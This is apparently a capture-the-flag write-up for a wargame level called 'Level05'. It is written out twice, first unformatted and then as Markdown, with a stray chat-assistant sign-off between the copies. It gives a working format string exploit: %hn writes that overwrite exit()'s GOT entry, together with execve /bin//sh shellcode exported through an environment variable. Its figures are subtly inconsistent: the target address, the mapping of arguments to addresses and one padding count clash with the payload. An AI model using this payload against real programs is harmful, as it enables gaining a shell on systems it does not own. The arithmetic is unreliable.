# Level05 – Format String Exploit

This level has a protected fgets input (no buffer overflow), but an unsafe printf without a format string and a call to exit()—which we can exploit.

## Key Differences
The target value is too large for a simple %n write.

Function addresses differ between debugger and real execution.

## Using %hn Instead of %n

%n writes 4 bytes, %hn writes 2 bytes.

To overwrite exit() at 0x080497e0, we split it:

Write lower 2 bytes at 0x080497e0

Write upper 2 bytes at 0x080497e2

Stack offset: input starts at the 10th argument (%10$hn), each 4 bytes:


%10$hn -> writes to 0x080497e0

%11$hn -> writes to 0x080497e2

## Example Payload

Goal: Write value 0xffffd6b8 (address of shellcode in env)

Lower: 0xd6b8 = 54968

Upper: 0xffff = 65535 → 65535 - 54968 = 10567

### Payload:


    "\xe2\x97\x04\x08" + "\xe0\x97\x04\x08" + "%54960x%11$hn" + "%10559x%10$hn"
    (Adjusting for the 8 bytes already printed by addresses)

Shellcode in Environment
Export shellcode:

    export SHELLCODE=$(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
Get its address:


    env -i SHELLCODE=... ./level05
Example result:

    0xffffd91a
Use this address as the value to overwrite exit()—when triggered, it jumps to your shellcode.

Let me know if you'd like this formatted for a specific platform (like GitHub-flavored Markdown).








# Level05 – Format String Exploit

This level has a protected `fgets` input (no buffer overflow), but an unsafe `printf` without a format string and a call to `exit()` — which we can exploit.

## Key Differences

- The target value is too large for a simple `%n` write.
- Function addresses differ between debugger and real execution.

## Using %hn Instead of %n

- `%n` writes 4 bytes, `%hn` writes 2 bytes.
- To overwrite `exit()` at `0x080497e0`, we split it:

  - Write lower 2 bytes at `0x080497e0`
  - Write upper 2 bytes at `0x080497e2`

- Stack offset: input starts at the 10th argument (`%10$hn`), each 4 bytes:

  - `%10$hn` → writes to `0x080497e0`
  - `%11$hn` → writes to `0x080497e2`

## Example Payload

**Goal**: Write value `0xffffd6b8` (address of shellcode in environment)

- Lower: `0xd6b8` = 54968
- Upper: `0xffff` = 65535 → `65535 - 54968 = 10567`

### Payload:

    "\xe2\x97\x04\x08" + "\xe0\x97\x04\x08" + "%54960x%11$hn" + "%10559x%10$hn"

    *(Adjusting for the 8 bytes already printed by addresses)*

## Shellcode in Environment

Export shellcode:

```bash
export SHELLCODE=$(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```
Get its address:

```bash
env -i SHELLCODE=... ./level05
```
Example result:

    0xffffd91a

Use this address as the value to overwrite exit() — when triggered, it jumps to your shellcode.